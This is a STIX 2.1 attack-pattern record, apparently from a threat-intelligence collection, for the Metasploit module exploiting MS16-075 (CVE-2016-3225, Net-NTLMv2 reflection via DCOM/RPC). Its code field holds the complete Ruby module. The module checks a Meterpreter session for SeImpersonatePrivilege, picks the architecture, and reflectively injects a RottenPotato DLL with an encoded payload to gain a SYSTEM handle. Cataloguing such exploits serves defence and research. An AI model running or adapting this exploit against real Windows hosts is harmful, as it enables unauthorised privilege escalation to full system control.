{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4ceb05f5-6cd0-4673-9106-1187396302c7",
    "created": "2024-08-14T16:49:37.30682Z",
    "modified": "2024-08-14T16:49:37.306824Z",
    "name": "Windows Net-NTLMv2 Reflection DCOM/RPC",
    "description": " Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to achieve a SYSTEM handle for elevation of privilege. Currently the module does not spawn as SYSTEM, however once achieving a shell, one can easily use incognito to impersonate the token.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms16_075_reflection.rb",
            "external_id": "ms16_075_reflection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-3225"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/"
        },
        {
            "source_name": "reference",
            "url": "https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/breenmachine/RottenPotatoNG"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Windows Net-NTLMv2 Reflection DCOM/RPC',\n          'Description' => %q{\n            Module utilizes the Net-NTLMv2 reflection between DCOM/RPC\n            to achieve a SYSTEM handle for elevation of privilege. Currently the module\n            does not spawn as SYSTEM, however once achieving a shell, one can easily\n            use incognito to impersonate the token.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'FoxGloveSec', # the original Potato exploit\n            'breenmachine', # Rotten Potato NG!\n            'Mumbai' # Austin : port of RottenPotato for reflection & quick module\n          ],\n          'Arch' => [ARCH_X86, ARCH_X64],\n          'Platform' => 'win',\n          'SessionTypes' => ['meterpreter'],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'none',\n            'WfsDelay' => '20'\n          },\n          'Targets' => [\n            ['Automatic', {}],\n            ['Windows x86', { 'Arch' => ARCH_X86 }],\n            ['Windows x64', { 'Arch' => ARCH_X64 }]\n          ],\n          'Payload' => {\n            'DisableNops' => true\n          },\n          'References' => [\n            ['MSB', 'MS16-075'],\n            ['CVE', '2016-3225'],\n            ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/'],\n            ['URL', 'https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/'],\n            ['URL', 'https://github.com/breenmachine/RottenPotatoNG']\n          ],\n          'DisclosureDate' => '2016-01-16',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_sys_config_getprivs\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def assign_target\n    if target.name == 'Automatic'\n      case sysinfo[\"Architecture\"]\n      when 'x86'\n        vprint_status(\"Found we are on an x86 target\")\n        my_target = targets[1]\n      when 'x64'\n        vprint_status(\"Found we are on an x64 target\")\n        my_target = targets[2]\n      else\n        fail_with(Failure::NoTarget, \"Unable to determine target\")\n      end\n    else\n      my_target = target\n    end\n    return my_target\n  end\n\n  def verify_arch(my_target)\n    if my_target[\"Arch\"] != sysinfo[\"Architecture\"]\n      print_error(\"Assigned Target Arch = #{my_target.opts['Arch']}\")\n      print_error(\"Actual Target Arch = #{sysinfo['Architecture']}\")\n      fail_with(Failure::BadConfig, \"Assigned Arch does not match reality\")\n    end\n    if client.arch != sysinfo[\"Architecture\"]\n      fail_with(Failure::BadConfig, \"Session/Target Arch mismatch; WOW64 not supported\")\n    else\n      vprint_good(\"Current payload and target Arch match....\")\n    end\n  end\n\n  def check\n    privs = client.sys.config.getprivs\n    if privs.include?('SeImpersonatePrivilege')\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n    my_target = assign_target\n    print_status(\"#{my_target['Arch']}\")\n    verify_arch(my_target)\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NoAccess, 'User does not have SeImpersonate Privilege')\n    end\n    if my_target.opts['Arch'] == 'x64'\n      dll_file_name = 'rottenpotato.x64.dll'\n      vprint_status(\"Assigning payload rottenpotato.x64.dll\")\n    elsif my_target.opts['Arch'] == 'x86'\n      dll_file_name = 'rottenpotato.x86.dll'\n      vprint_status(\"Assigning payload rottenpotato.x86.dll\")\n    else\n      fail_with(Failure::BadConfig, \"Unknown target arch; unable to assign exploit code\")\n    end\n\n    print_status(\"Reflectively injecting the exploit DLL and triggering the exploit...\")\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, \"exploits\", \"rottenpotato\", dll_file_name),\n      encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-01-16",
    "x_mitre_platforms": [
        "win'"
    ]
}